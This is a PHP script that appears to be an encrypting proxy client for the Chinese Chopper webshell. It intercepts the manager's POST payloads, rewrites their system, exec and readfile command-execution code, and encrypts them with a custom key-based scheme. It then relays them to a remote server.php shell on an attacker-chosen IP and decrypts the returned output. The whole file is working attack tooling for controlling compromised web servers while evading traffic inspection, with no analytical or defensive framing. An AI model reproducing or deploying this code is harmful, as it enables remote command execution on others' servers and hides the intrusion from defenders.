<?PHP

//菜刀http://localhost/client.php?ip=x.x.x.x&file=server.php&k=123456 密码:a

$pass = $_GET['k'];


function decrypt($data, $key)
{
 $key = md5($key);
    $x = 0;
    $data = base64_decode($data);
    $len = strlen($data);
    $l = strlen($key);
    for ($i = 0; $i < $len; $i++)
    {
        if ($x == $l) 
        {
         $x = 0;
        }
        $char .= substr($key, $x, 1);
        $x++;
    }
    for ($i = 0; $i < $len; $i++)
    {
        if (ord(substr($data, $i, 1)) < ord(substr($char, $i, 1)))
        {
            $str .= chr((ord(substr($data, $i, 1)) + 256) - ord(substr($char, $i, 1)));
        }
        else
        {
            $str .= chr(ord(substr($data, $i, 1)) - ord(substr($char, $i, 1)));
        }
    }
    return $str;
}







function encrypt($data, $key)
{
 $key = md5($key);
    $x  = 0;
    $len = strlen($data);
    $l  = strlen($key);
    for ($i = 0; $i < $len; $i++)
    {
        if ($x == $l) 
        {
         $x = 0;
        }
        $char .= $key{$x};
        $x++;
    }
    for ($i = 0; $i < $len; $i++)
    {
        $str .= chr(ord($data{$i}) + (ord($char{$i})) % 256);
    }
   return base64_encode($str);
   #return $str;
}











$PostStr = array();
$i =0;
while(list($name,$value)=each($_POST))
{ 

    $key = $name;
    
    if($i==0)
    {
	
	$value = str_replace("base64_decode","base64_decode(decrypt",$value);
  	preg_match("/decrypt(.*?)\)/",$value,$match);
   # 	echo $match[1]."----";
	$value = str_replace($match[1],$match[1].",".$pass.")",$value);
	$i=111;
#	echo $value;
	$value = encrypt($value,$pass);
#	echo $value."++";
    }
	
	
    if($name=="z0")
    {
#	echo base64_decode($value);
 	$value = "\$Naih=\"\";\$NaihTmp=\"\";\$NaihArray=array();". base64_decode($value);
	$value = str_replace("echo(\"->|\")","",$value);
	$value = str_replace("echo(\"|<-\")","",$value);
	$value = str_replace("echo ","\$Naih = \$Naih.\$NaihTmp;\$NaihTmp=",$value);
	$value = str_replace("print ","\$Naih = \$Naih.\$NaihTmp;\$NaihTmp=",$value);
	$value = str_replace("echo","\$Naih = \$Naih.",$value);
	$value = str_replace("@system(\$r.\" 2>&1\"","@exec(\$r.\" 2>&1\",\$NaihArray",$value);
	$value = str_replace("@readfile(","\$Naih = \$Naih.file_get_contents(",$value);
	$value = str_replace("die","\$Naih = \$Naih.\$NaihTmp;\$NaihTmp = implode(\"\\r\\n\",\$NaihArray);\$Naih = \$Naih.\$NaihTmp;\$Naih = \"->|\".\$Naih.\"|<-\";echo \"->|\".encrypt(base64_encode(\$Naih),".$pass.").\"|<-\";die",$value);
#	echo "------------------------------------------";
#	echo $value;
#	echo "------------------------------------------";
	$value = base64_encode($value);
	$value = encrypt($value,$pass);
#	echo $value;
#	echo "-------------------------------------------";
    }

	
    $PostStr[$key] = $value;
  #  echo $value;

}

#echo 1;

#foreach ($PostStr as $key2 => $value2)
#{
#   echo $key2."=".urlencode($value2)."&";
#}
#echo "++++";


#require dirname(__FILE__).'/function.php';  
  
function file_get_contents_post($url, $post) {  
    $options = array(  
        'http' => array(  
            'method' => 'POST',  
            'content' => http_build_query($post),  
        ),  
    );  
  
    $result = file_get_contents($url, false, stream_context_create($options));  
  
    return $result;  
}  
#echo "http://".$_GET['ip']."/".$_GET['file']; 
#echo decrypt($_POST['a'],"123456")."====+++====";
$data = file_get_contents_post("http://".$_GET['ip']."/".$_GET['file'], $PostStr);


#echo $data;

preg_match_all('/->\|(.*)\|<-/',$data,$match);

#echo $match[1][0];
#echo "+++++++++++++++++++++";
#$result =  str_replace("|<-","",str_replace("->|","",$match[1][0]));

#echo $result;

#echo "------------------------".$data."----------------------";

echo base64_decode(decrypt($match[1][0],$pass));




?>
